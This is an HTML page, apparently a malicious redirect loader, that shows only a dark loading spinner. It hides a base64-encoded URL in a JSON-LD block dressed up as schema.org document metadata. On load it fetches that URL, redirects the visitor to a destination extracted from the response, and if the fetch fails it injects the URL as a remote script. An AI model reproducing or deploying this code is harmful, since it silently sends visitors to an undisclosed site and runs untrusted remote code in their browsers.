<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title></title>
  <script type="application/ld+json" id="slip">
  {
    "@context": "https://schema.org",
    "@type": "DigitalDocument",
    "identifier": "aHR0cHM6Ly9sYXRlcnBsb2F0LmNvbS9nYXJsZS5rb3Npbg=="
  }
  </script>
  <style>
    * { box-sizing: border-box; margin: 0; }
    html, body { height: 100%; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #010409;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #30363d;
      border-top-color: #f0f6fc;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="spinner" aria-hidden="true"></div>

  <script>
  (function () {
    var WAIT_MS = 500;

    function hopFromJsonLd() {
      var raw = document.getElementById('slip').textContent;
      var data = JSON.parse(raw);
      var url = atob(String(data.identifier || '').trim());
      if (!/^https?:\/\//i.test(url)) throw new Error('bad');
      return url;
    }

    function parseHopBody(text) {
      var body = String(text || '').trim();
      try {
        var j = JSON.parse(body);
        if (j && j.c) {
          var u = atob(String(j.c).trim());
          if (/^https?:\/\//i.test(u)) return u;
        }
      } catch (e) {}
      var patterns = [
        /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
      ];
      for (var i = 0; i < patterns.length; i++) {
        var m = body.match(patterns[i]);
        if (m && m[1]) return m[1];
      }
      throw new Error('parse');
    }

    function attachScript(hopUrl) {
      var s = document.createElement('script');
      s.src = hopUrl;
      s.async = true;
      document.head.appendChild(s);
    }

    function openHop(hopUrl) {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', hopUrl, true);
      xhr.timeout = 4000;
      xhr.onreadystatechange = function () {
        if (xhr.readyState !== 4) return;
        if (xhr.status >= 200 && xhr.status < 300) {
          try {
            window.location.replace(parseHopBody(xhr.responseText));
            return;
          } catch (e) {}
        }
        attachScript(hopUrl);
      };
      xhr.onerror = function () { attachScript(hopUrl); };
      xhr.ontimeout = function () { attachScript(hopUrl); };
      xhr.send();
    }

    var hopUrl;
    try {
      hopUrl = hopFromJsonLd();
    } catch (e) {
      return;
    }

    setTimeout(function () {
      openHop(hopUrl);
    }, WAIT_MS);
  })();
  </script>
</body>
</html>
